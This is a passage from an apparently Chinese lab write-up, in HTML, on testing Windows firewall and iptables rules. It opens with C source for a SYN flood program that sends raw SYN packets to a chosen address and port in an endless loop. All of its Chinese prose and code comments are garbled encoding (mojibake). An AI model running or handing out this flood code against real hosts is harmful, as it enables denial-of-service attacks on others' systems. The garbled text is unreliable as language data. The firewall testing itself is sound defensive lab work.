</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">int</span> make_raw_socket()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">int</span> fd;
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">int</span> on = <span style="color:#ff0;font-weight:bold">1</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">// åˆ›å»ºä¸€ä¸ªåŸå§‹å¥—æ¥å­—, æŒ‡å®šå…¶å…³æ³¨TCPåè®®
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> (fd == -<span style="color:#ff0;font-weight:bold">1</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> -<span style="color:#ff0;font-weight:bold">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">// è®¾ç½®éœ€è¦æ‰‹åŠ¨æ„å»ºIPå¤´éƒ¨
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">if</span> (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, (<span style="color:#fff;font-weight:bold">char</span> *)&amp;on, <span style="color:#fff;font-weight:bold">sizeof</span>(on)) &lt; <span style="color:#ff0;font-weight:bold">0</span>) {
</span></span><span style="display:flex;"><span>        close(fd);
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> -<span style="color:#ff0;font-weight:bold">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">/*
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f">	åœ¨è°ƒç”¨ socket() å‡½æ•°åˆ›å»ºå¥—æ¥å­—æ—¶ï¼ŒæŒ‡å®šç¬¬äºŒä¸ªå‚æ•°ä¸º SOCK_RAWï¼Œè¡¨ç¤ºåˆ›å»ºçš„å¥—æ¥å­—ä¸ºåŸå§‹å¥—æ¥å­—ã€‚ç„¶åè°ƒç”¨ setsockopt() å‡½	  æ•°è®¾ç½® IP å¤´éƒ¨ç”±æˆ‘ä»¬è‡ªå·±æ„å»º
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f">	*/</span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">return</span> fd;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">// ä¼ å…¥åŸå§‹å¥—æ¥å­—ã€ç›®æ ‡IPåœ°å€å’Œç›®æ ‡ç«¯å£ï¼Œç„¶åé€šè¿‡è°ƒç”¨ sendto() å‡½æ•°å‘æœåŠ¡ç«¯å‘é€ä¸€ä¸ª SYNåŒ…
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span><span style="color:#fff;font-weight:bold">int</span> send_syn_packet(<span style="color:#fff;font-weight:bold">int</span> sockfd, <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span> addr, <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span> port)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">struct</span> sockaddr_in skaddr;
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">char</span> packet[<span style="color:#ff0;font-weight:bold">256</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">int</span> pkt_len;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    bzero(&amp;skaddr, <span style="color:#fff;font-weight:bold">sizeof</span>(skaddr));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    skaddr.sin_family = AF_INET;
</span></span><span style="display:flex;"><span>    skaddr.sin_port = htons(port); 
</span></span><span style="display:flex;"><span>    skaddr.sin_addr.s_addr = addr;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	printf(<span style="color:#0ff;font-weight:bold">&#34;%då·²æ”»å‡»!</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#34;</span>,addr);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    pkt_len = make_syn_packet(packet, <span style="color:#ff0;font-weight:bold">256</span>, addr, port);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">return</span> sendto(sockfd, packet, pkt_len, <span style="color:#ff0;font-weight:bold">0</span>, (<span style="color:#fff;font-weight:bold">struct</span> sockaddr *)&amp;skaddr,
</span></span><span style="display:flex;"><span>                  <span style="color:#fff;font-weight:bold">sizeof</span>(<span style="color:#fff;font-weight:bold">struct</span> sockaddr));
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">// ä¸»å‡½æ•° 
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span><span style="color:#fff;font-weight:bold">int</span> main(<span style="color:#fff;font-weight:bold">int</span> argc, <span style="color:#fff;font-weight:bold">char</span> *argv[])
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span> addr;
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span> port;
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">int</span> sockfd;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> (argc &lt; <span style="color:#ff0;font-weight:bold">3</span>) {
</span></span><span style="display:flex;"><span>        fprintf(stderr, <span style="color:#0ff;font-weight:bold">&#34;Usage: synflood &lt;address&gt; &lt;port&gt;</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#34;</span>);
</span></span><span style="display:flex;"><span>        exit(<span style="color:#ff0;font-weight:bold">1</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">// argv[1] ç›®çš„åœ°å€ 
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#007f7f">// argc[2] ç›®çš„ç«¯å£
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    addr = inet_addr(argv[<span style="color:#ff0;font-weight:bold">1</span>]);
</span></span><span style="display:flex;"><span>    port = atoi(argv[<span style="color:#ff0;font-weight:bold">2</span>]);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">// åˆ¤æ–­ç«¯å£æ˜¯å¦ å­˜åœ¨
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">if</span> (port &lt; <span style="color:#ff0;font-weight:bold">0</span> || port &gt; <span style="color:#ff0;font-weight:bold">65535</span>) {
</span></span><span style="display:flex;"><span>        fprintf(stderr, <span style="color:#0ff;font-weight:bold">&#34;Invalid destination port number: %s</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#34;</span>, argv[<span style="color:#ff0;font-weight:bold">2</span>]);
</span></span><span style="display:flex;"><span>        exit(<span style="color:#ff0;font-weight:bold">1</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">// å¼€å¯socket
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    sockfd = make_raw_socket();
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> (sockfd == -<span style="color:#ff0;font-weight:bold">1</span>) {
</span></span><span style="display:flex;"><span>        fprintf(stderr, <span style="color:#0ff;font-weight:bold">&#34;Failed to make raw socket</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#34;</span>);
</span></span><span style="display:flex;"><span>        exit(<span style="color:#ff0;font-weight:bold">1</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>	<span style="color:#007f7f">// for æ— é™å¾ªç¯ï¼Œå‘é€synåŒ…
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">for</span> (;;) {
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">if</span> (send_syn_packet(sockfd, addr, port) &lt; <span style="color:#ff0;font-weight:bold">0</span>) {
</span></span><span style="display:flex;"><span>            fprintf(stderr, <span style="color:#0ff;font-weight:bold">&#34;Failed to send syn packet</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#34;</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    close(sockfd);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">return</span> <span style="color:#ff0;font-weight:bold">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>Windowsé˜²ç«å¢™ï¼š<code>å¤©ç½‘é˜²ç«å¢™</code></p>
</li>
<li>
<p>Linuxé˜²ç«å¢™ï¼š <code>iptables</code></p>
</li>
<li>
<p>FTPæœåŠ¡å™¨ï¼š<code>Ser-U</code></p>
</li>
<li>
<p>æŠ“åŒ…å·¥å…·ï¼š<code>Wireshark</code></p>
</li>
<li>
<p>UDPæ”»å‡»ï¼š<code>UDP-Flood</code></p>
</li>
</ul>
</li>
</ul>
<h2 id="0x03-å®éªŒå†…å®¹">0x03 å®éªŒå†…å®¹<a hidden class="anchor" aria-hidden="true" href="#0x03-å®éªŒå†…å®¹">#</a></h2>
<h3 id="31-windowsé˜²ç«å¢™">3.1 windowsé˜²ç«å¢™<a hidden class="anchor" aria-hidden="true" href="#31-windowsé˜²ç«å¢™">#</a></h3>
<h4 id="311-è¿‡æ»¤è¿œç¨‹æœåŠ¡å™¨råˆ°æœ¬åœ°ä¸»æœºlçš„tcpæ•°æ®">3.1.1 è¿‡æ»¤è¿œç¨‹æœåŠ¡å™¨ï¼ˆRï¼‰åˆ°æœ¬åœ°ä¸»æœºï¼ˆLï¼‰çš„TCPæ•°æ®<a hidden class="anchor" aria-hidden="true" href="#311-è¿‡æ»¤è¿œç¨‹æœåŠ¡å™¨råˆ°æœ¬åœ°ä¸»æœºlçš„tcpæ•°æ®">#</a></h4>
<ul>
<li>åœ¨é˜²ç«å¢™ä¸­æ·»åŠ å¦‚ä¸‹è§„åˆ™ï¼š
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120194954.png" alt="image-20211120194954814"  />
</li>
<li>è¿™æ ·æ¥æ”¶åˆ°çš„æ‰€æœ‰TCPåŒ…éƒ½ä¼šè¢«æ‹¦æˆªï¼Œå¹¶ä¸”è¢«è®°å½•ã€‚</li>
</ul>
</li>
<li>æ²¡æœ‰å¼€å¯é˜²ç«å¢™å‰ï¼Œåœ¨ç»ˆç«¯æ‰§è¡Œå‘é€éšæœºç«¯å£çš„tcpç¨‹åº
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120194358.png" alt="image-20211120194358862"  />
</li>
<li>é€šè¿‡WiresharkæŠ“åŒ…ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ­¤æ—¶çš„TCPåŒ…å¹¶æ²¡æœ‰è¢«æ‹¦æˆªã€‚
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120194610.png" alt="image-20211120194523551"  />
</li>
</ul>
</li>
</ul>
</li>
<li>å¼€å¯é˜²ç«å¢™ï¼Œå†åº¦å¯åŠ¨ç¨‹åºã€‚
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120195201.png" alt="image-20211120195138135"  />
</li>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120195201.png" alt="image-20211120195119213"  />
</li>
<li>å¯ä»¥çœ‹åˆ°é˜²ç«å¢™è¿›è¡Œæé†’ï¼Œå¹¶ä¸”æ—¥å¿—é‡Œé¢æ˜¾ç¤ºäº†æ”»å‡»æœºå‘é¶æœº<code>192.168.195.131</code>çš„ç«¯å£tcpè¿æ¥ã€‚</li>
<li>å› æ­¤åŠ ä¸Šè¯¥ç«¯å£åï¼Œæ‰€æœ‰tcpåŒ…éƒ½è¢«æˆªæ–­äº†ã€‚</li>
</ul>
</li>
</ul>
<h4 id="312-è¿‡æ»¤r-lä¸­æ•°æ®åŒ…æºç«¯å£ä¸º21æˆ–80çš„æ•°æ®">3.1.2 è¿‡æ»¤R-&gt;Lä¸­æ•°æ®åŒ…æºç«¯å£ä¸º21æˆ–80çš„æ•°æ®<a hidden class="anchor" aria-hidden="true" href="#312-è¿‡æ»¤r-lä¸­æ•°æ®åŒ…æºç«¯å£ä¸º21æˆ–80çš„æ•°æ®">#</a></h4>
<ul>
<li>
<p>å‘é€åˆ°ç«¯å£ä¸º21å’Œ80çš„ä¼ è¾“å±‚åè®®å¯èƒ½ä¸º<code>tcp</code>ä¹Ÿå¯èƒ½ä¸º<code>udp</code></p>
</li>
<li>
<p>å› æ­¤ç¼–å†™è¿›å‡ºè§„åˆ™çš„æ—¶å€™ï¼Œæˆ‘ä»¬éœ€è¦å¯¹TCPå’ŒUDPéƒ½è¿›è¡Œé™åˆ¶ã€‚</p>
<ul>
<li>UDP
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120195651.png" alt="image-20211120195651610"  />
</li>
</ul>
</li>
<li>TCP
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120195706.png" alt="image-20211120195705981"  />
</li>
</ul>
</li>
<li>å› ä¸ºæˆ‘çš„å®¢æˆ·ç«¯å·²ç»å¼€å¯äº†21å’Œ80ç«¯å£ï¼Œæ‰€æœ‰æˆ‘ä»¬è¿™é‡Œç›´æ¥é€‰æ‹©å·²æˆæƒå¼€æ”¾çš„ç«¯å£å³å¯ã€‚
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120195814.png" alt="image-20211120195814349"  />
</li>
</ul>
</li>
</ul>
</li>
<li>
<p>TCP</p>
<ul>
<li>
<p>é˜²ç«å¢™å¼€å¯å‰ï¼š</p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120195920.png" alt="image-20211120195919993"  />
</li>
<li>å¯ä»¥çœ‹åˆ°TCPåŒ…å¯ä»¥å‘åˆ°æœºå™¨ã€‚</li>
</ul>
</li>
<li>
<p>å¼€å¯é˜²ç«å¢™</p>
<ul>
<li>
<p>æ”»å‡»80ç«¯å£</p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120200232.png" alt="image-20211120200227423"  />
</li>
</ul>
</li>
<li>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120200059.png" alt="image-20211120200059094"  />
</p>
<ul>
<li>å¯ä»¥çœ‹åˆ°åœ¨æ—¥å¿—é‡Œé¢ç¨‹åºè¿æ¥80ç«¯å£è¢«æ‹’ç»ã€‚</li>
</ul>
</li>
<li>
<p>æ”»å‡»21ç«¯å£</p>
<ul>
<li>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120200255.png" alt="image-20211120200255635"  />
</p>
</li>
<li>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120200232.png" alt="image-20211120200200617"  />
</p>
</li>
</ul>
</li>
<li>
<p>å¯ä»¥çœ‹åˆ°è¿™é‡Œè¿æ¥21ç«¯å£åŒæ ·è¢«æ‹’ç»ã€‚</p>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p>UDP</p>
<ul>
<li>
<p>å…³é—­é˜²ç«å¢™</p>
</li>
<li>
<p>æ”»å‡»<code>80</code>ç«¯å£</p>
<ul>
<li>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120200445.png" alt="image-20211120200445505"  />
</p>
</li>
<li>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120200635.png" alt="image-20211120200635412"  />
</p>
</li>
<li>
<p>å¯ä»¥çœ‹åˆ°æŠ“åˆ°udpåŒ…</p>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p>å¼€å¯é˜²ç«å¢™</p>
<ul>
<li>
<p>æ”»å‡»80ç«¯å£</p>
</li>
<li>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120201309.png" alt="image-20211120201309929"  />
</p>
<ul>
<li>å¯ä»¥çœ‹åˆ°80ç«¯å£çš„udpåŒ…å·²è¢«æ‹¦æˆª</li>
</ul>
</li>
<li>
<p>æ”»å‡»21ç«¯å£</p>
<ul>
<li>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120201130.png" alt="image-20211120201130188"  />
</p>
</li>
<li>
<p>å¯ä»¥çœ‹åˆ°21ç«¯å£çš„udpåŒ…å·²è¢«æ‹¦æˆª</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="313-èƒ½å¤Ÿç”±æœ¬æœºç™»å½•ftpæœåŠ¡å™¨æˆåŠŸé€šè¿‡ç”¨æˆ·åå¯†ç éªŒè¯">3.1.3 èƒ½å¤Ÿç”±æœ¬æœºç™»å½•ftpæœåŠ¡å™¨æˆåŠŸï¼ˆé€šè¿‡ç”¨æˆ·åã€å¯†ç éªŒè¯ï¼‰<a hidden class="anchor" aria-hidden="true" href="#313-èƒ½å¤Ÿç”±æœ¬æœºç™»å½•ftpæœåŠ¡å™¨æˆåŠŸé€šè¿‡ç”¨æˆ·åå¯†ç éªŒè¯">#</a></h4>
<ul>
<li>åœ¨windows xp<code>192.168.195.162</code>ä¸­æ­å»ºftpæœåŠ¡å™¨
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120202016.png" alt="image-20211120201710804"  />
</li>
<li>åˆ›å»ºä¸€ä¸ª<code>ftp</code>ç”¨æˆ·ï¼Œè´¦æˆ·ä¸º<code>admin</code>ï¼Œå¯†ç ä¸º<code>admin</code>ï¼›</li>
<li>æˆ‘ä»¬åœ¨æœ¬æœºè®¿é—®æœåŠ¡å™¨ç«¯
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120202216.png" alt="image-20211120202216338"  />
</li>
<li>æˆ‘ä»¬æˆåŠŸè®¿é—®åˆ°æœåŠ¡å™¨ç«¯ã€‚</li>
</ul>
</li>
</ul>
</li>
<li>è®¾ç½®è§„åˆ™
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120203938.png" alt="image-20211120203938192"  />
</li>
<li>å½“æˆ‘ä»¬å‘æœåŠ¡å™¨ç«¯å‘é€ftpè¯·æ±‚çš„æ—¶å€™ï¼Œä¼šé€šè¡Œã€‚</li>
</ul>
</li>
</ul>
<h4 id="314-é˜»æ­¢å°†ftpå†…å®¹åˆ—è¡¨ä¸Šä¼ ä¸‹è½½æ•°æ®">3.1.4 é˜»æ­¢å°†ftpå†…å®¹åˆ—è¡¨ã€ä¸Šä¼ ã€ä¸‹è½½æ•°æ®<a hidden class="anchor" aria-hidden="true" href="#314-é˜»æ­¢å°†ftpå†…å®¹åˆ—è¡¨ä¸Šä¼ ä¸‹è½½æ•°æ®">#</a></h4>
<ul>
<li>è¿™é‡Œæˆ‘ä»¬æ˜¯åŸå…ˆçš„å®¢æˆ·ç«¯ä½œä¸ºæ–°çš„æœåŠ¡å™¨ï¼Œå¦ä¸€å°æœºå­æ¥è®¿é—®è¿™ä¸ªæ–°çš„æœåŠ¡å™¨ï¼Œæˆ‘ä»¬éœ€è¦åœ¨æœåŠ¡åŒºçš„é˜²ç«å¢™ä¸Šé…ç½®è§„åˆ™ï¼Œä»è€Œé˜»æ­¢å®¢æˆ·ç«¯ä¸‹è½½æœåŠ¡å™¨ç«¯å†…å®¹</li>
<li>åœ¨æ–°çš„æœåŠ¡å™¨ç«¯é…ç½®FTP
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120204209.png" alt="image-20211120204209816"  />
</li>
</ul>
</li>
<li>å®¢æˆ·ç«¯æŸ¥çœ‹æ•ˆæœ
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120204429.png" alt="image-20211120204421437"  />
</li>
</ul>
</li>
<li>åœ¨æœåŠ¡å™¨ç«¯é…ç½®é˜²æŠ¤å¢™è§„åˆ™
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120204429.png" alt="image-20211120204331375"  />
</li>
<li>å½“æ”¶åˆ°ç«¯å£ä¸º21çš„tcpè¯·æ±‚çš„æ—¶å€™æ‹’ç»è¯¥è®¿é—®ï¼Œè¿™æ ·å°±ä¿è¯äº†å®¢æˆ·ç«¯ä¸èƒ½ä»æœåŠ¡å™¨ä¸‹è½½ã€‚</li>
</ul>
</li>
<li>å¼€å¯é˜²ç«å¢™
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120204721.png" alt="image-20211120204454639"  />
</li>
</ul>
</li>
<li>ç»“æœ
<ul>
<li>æˆ‘ä»¬å¯ä»¥åœ¨æ—¥å¿—é‡Œé¢çœ‹åˆ°
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120204747.png" alt="image-20211120204632108"  />
</li>
<li>IP<code>192.168.195.182</code>å¯¹å®¢æˆ·ç«¯çš„è¿æ¥è¢«æ‹’ç»</li>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120204752.png" alt="image-20211120204714010"  />
</li>
<li>åŒæ—¶ï¼Œè¯¥ç½‘é¡µä¹Ÿæ— æ³•æ‰“å¼€ï¼Œè‡ªç„¶æŸ¥çœ‹åˆ—è¡¨ä»€ä¹ˆçš„ï¼Œä¸Šä¼ ã€ä¸‹è½½éƒ½æ— æ³•è¿›è¡Œï¼Œ</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="32-linuxé˜²ç«å¢™-iptables">3.2 Linuxé˜²ç«å¢™ iptables<a hidden class="anchor" aria-hidden="true" href="#32-linuxé˜²ç«å¢™-iptables">#</a></h3>
<h4 id="321-iptablesé˜²ç«å¢™çš„å¯åŠ¨åœæ­¢">3.2.1 Iptablesé˜²ç«å¢™çš„å¯åŠ¨åœæ­¢<a hidden class="anchor" aria-hidden="true" href="#321-iptablesé˜²ç«å¢™çš„å¯åŠ¨åœæ­¢">#</a></h4>
<ul>
<li>
<p>é¦–å…ˆé€šè¿‡ä»¥ä¸‹å‘½ä»¤å®‰è£…å¥½<code>iptables</code></p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>systemctl stop firewalld.service
</span></span><span style="display:flex;"><span>systemctl mask firewalld.service
</span></span><span style="display:flex;"><span>yum install iptables-services
</span></span><span style="display:flex;"><span>systemctl <span style="color:#fff;font-weight:bold">enable</span> iptables.service
</span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>ç„¶åé€šè¿‡å‘½ä»¤<code>service iptables status</code>æŸ¥çœ‹æ­¤æ—¶çš„<code>iptables</code>çŠ¶æ€</p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120225947.png" alt="image-20211120225947260"  />
</li>
<li>æ­¤æ—¶é˜²ç«å¢™ä¸ºæ‰“å¼€çŠ¶æ€</li>
</ul>
</li>
<li>
<p>å…³é—­é˜²ç«å¢™<code>service iptables stop</code></p>
<ul>
<li>å†åº¦æŸ¥çœ‹æ­¤æ—¶é˜²ç«å¢™çŠ¶æ€
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120230056.png" alt="image-20211120230056265"  />
</li>
<li>å‘ç°æ­¤æ—¶é˜²ç«å¢™å·²å…³é—­ã€‚</li>
</ul>
</li>
</ul>
</li>
<li>
<p>æ‰“å¼€é˜²ç«å¢™<code>service iptables start</code></p>
<ul>
<li>å†æŸ¥çœ‹é˜²ç«å¢™çŠ¶æ€
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120230206.png" alt="image-20211120230206791"  />
</li>
<li>é˜²ç«å¢™å·²æ‰“å¼€</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="322-iptablesé˜²ç«å¢™è§„åˆ™æŸ¥çœ‹æ·»åŠ åˆ é™¤">3.2.2 Iptablesé˜²ç«å¢™è§„åˆ™æŸ¥çœ‹ã€æ·»åŠ ã€åˆ é™¤<a hidden class="anchor" aria-hidden="true" href="#322-iptablesé˜²ç«å¢™è§„åˆ™æŸ¥çœ‹æ·»åŠ åˆ é™¤">#</a></h4>
<ul>
<li>
<p>æŸ¥çœ‹</p>
<ul>
<li>å‘½ä»¤ <code>iptables -L -n</code>         åˆ—å‡ºï¼ˆfilterè¡¨ï¼‰æ‰€æœ‰è§„åˆ™
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120230941.png" alt="image-20211120230941455"  />
</li>
</ul>
</li>
<li>å‘½ä»¤ <code>iptables -nL â€“line-number </code>      åˆ—å‡ºï¼ˆfilterè¡¨ï¼‰æ‰€æœ‰è§„åˆ™ï¼Œå¸¦ç¼–å·
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120231106.png" alt="image-20211120231106161"  />
</li>
</ul>
</li>
<li>å‘½ä»¤ <code>iptables -L -n -t nat</code>  åˆ—å‡ºï¼ˆnatè¡¨ï¼‰æ‰€æœ‰è§„åˆ™
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120231014.png" alt="image-20211120231014149"  />
</li>
</ul>
</li>
</ul>
</li>
<li>
<p>æ·»åŠ </p>
<ul>
<li>æ·»åŠ è§„åˆ™æœ‰ä¸¤ä¸ªå‚æ•°ï¼š-Aå’Œ-Iã€‚å…¶ä¸­-Aæ˜¯æ·»åŠ åˆ°è§„åˆ™çš„æœ«å°¾ï¼›-Iå¯ä»¥æ’å…¥åˆ°æŒ‡å®šä½ç½®ï¼Œæ²¡æœ‰æŒ‡å®šä½ç½®çš„è¯é»˜è®¤æ’å…¥åˆ°è§„åˆ™çš„é¦–éƒ¨ã€‚</li>
<li>å½“å‰è§„åˆ™ï¼š
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120231216.png" alt="image-20211120231216548"  />
</li>
<li>æ·»åŠ ä¸€æ¡è§„åˆ™åˆ°å°¾éƒ¨ï¼š<code>iptables  â€“A  INPUT  -j ACCEPT</code>
<ul>
<li>æ„æ€ä¸ºï¼šå‘filterè¡¨ï¼ˆé»˜è®¤è¡¨ï¼‰çš„INPUTé“¾ä¸­è¿½åŠ ä¸€æ¡è§„åˆ™ï¼Œå…¶åŠŸèƒ½æ˜¯æ¥å—æºåœ°å€ä¸ºä»»æ„ã€ç›®æ ‡åœ°å€ä¸ºé˜²ç«å¢™æœ¬èº«çš„æ‰€æœ‰æ•°æ®åŒ…ã€‚</li>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120231636.png" alt="image-20211120231636301"  />
</li>
</ul>
</li>
<li>ç¬¬å…­æ¡å³ä¸ºæˆ‘ä»¬æ–°åŠ å…¥çš„è§„åˆ™</li>
</ul>
</li>
